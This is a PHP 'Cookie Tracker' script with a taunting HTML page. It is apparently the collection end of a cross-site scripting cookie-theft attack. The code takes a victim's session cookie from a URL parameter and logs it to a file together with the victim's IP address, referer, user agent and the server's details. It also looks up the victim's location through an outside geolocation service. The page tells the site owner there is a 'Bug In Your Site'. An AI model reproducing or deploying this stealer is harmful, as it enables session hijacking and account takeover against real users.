<?php 
###############################
#                             #
#                             #
#     Cookie Tracker v 1.0    #
#                             #
#                             #
###############################

$cookie = "[+]Victime Cookie => [ " . $_GET['cookie'] . " ]"; // www.website.com/cookie.php?cookie=
$ip = "[+]Victim IP => [ " . $_SERVER['REMOTE_ADDR'] . " ]";
$ref = "[+]Victim Comes From => [ " . $_SERVER['HTTP_REFERER'] . " ]";
$uAgent = "[+]Victim Details => [ " . $_SERVER['HTTP_USER_AGENT'] . " ]";
$sNAME = "[+]Server Name => [ " . $_SERVER['SERVER_NAME'] . " ]";
$sIP = "[+]Server IP => [ " . $_SERVER['SERVER_ADDR'] . " ]";
// Start Code from Stack Over Flow
// Function to get the user IP address
function get_client_ip() {
     $ipaddress = '';
    if (isset($_SERVER['HTTP_CLIENT_IP'])) {
        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    } else if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else if (isset($_SERVER['HTTP_X_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
    } else if (isset($_SERVER['HTTP_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
    } else if (isset($_SERVER['HTTP_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED'];
    } else if (isset($_SERVER['REMOTE_ADDR'])) {
        $ipaddress = $_SERVER['REMOTE_ADDR'];
    } else {
        $ipaddress = 'UNKNOWN';
    }

    return $ipaddress;
} 

$PublicIP = get_client_ip();
$json     = file_get_contents("http://ipinfo.io/$PublicIP/geo");
$json     = json_decode($json, true);
$country  = "User Country Is => " . $json['country'];
$region   = "User Reigon Is => " . $json['region'];
$city     = "User City Is => " . $json['city'];
// End Code Stack Over Flow

// Conact all Information in One Location
$all = "\n----{Begin}----\n" . $cookie . "\n\n" . $ip . "\n\n" . $ref . "\n\n" . $uAgent . "\n\n" . $sNAME . "\n\n" . $sIP . "\n\n" . "----{LOCATION}---" . "\n\n" .$country . "\n" . $region . "\n" . $city . "\n\n" . "------{End}-----";
$handle = fopen('Log.txt', 'a');
fwrite($handle, $all);
fclose($handle);
?>


<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>LoL.. Not Me</title>
</head>
<body style="background-color:black;">
  <center>
    <h1><p style='color:red'><b><em>Bug In Your Site</b></em></p></h1>
    <h1><p style="color:red;"><b>Welcome to LoL Site</b></h1>
    <h2 ><p style="color:white;"><b>I'm not Seif And I'm laugh with you, Don't afraid :)</b></h2>
    <h2><p style="color:yellow;"> <b>To Contact Me, I don't Tell You ... ;)</b></p></h2>
    <p style="color:blue;">{{SeifDesoki@mail.ch}}</p>
    <br><br>
    <p style="color:white"><b>You Can Also Visit My Account In Hacker One</b></p>
    <form action="http://hackerone.com" targrt="_blank">
      <input type="submit" value="Click Here">
    </form>
    <br><br>
  </center>
</body>
</html>


